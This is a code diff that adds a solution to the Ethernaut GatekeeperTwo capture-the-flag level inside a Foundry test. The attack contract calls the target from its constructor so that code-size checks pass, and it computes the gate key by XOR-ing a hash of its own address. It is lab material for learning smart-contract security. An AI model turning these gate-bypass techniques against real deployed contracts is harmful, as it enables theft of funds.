@@ -17,5 +17,17 @@ contract GatekeeperTwoLevel is SetUpLevelTest {
         gatekeeperTwo = GatekeeperTwo(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player, player);
+        new GateAttackTwo(address(gatekeeperTwo));
+        vm.stopPrank();
+    }
+}
+
+contract GateAttackTwo {
+    constructor(address _target) {
+        uint64 key = uint64(
+            bytes8(keccak256(abi.encodePacked(address(this))))
+        ) ^ type(uint64).max;
+        GatekeeperTwo(_target).enter(bytes8(key));
     }
 }
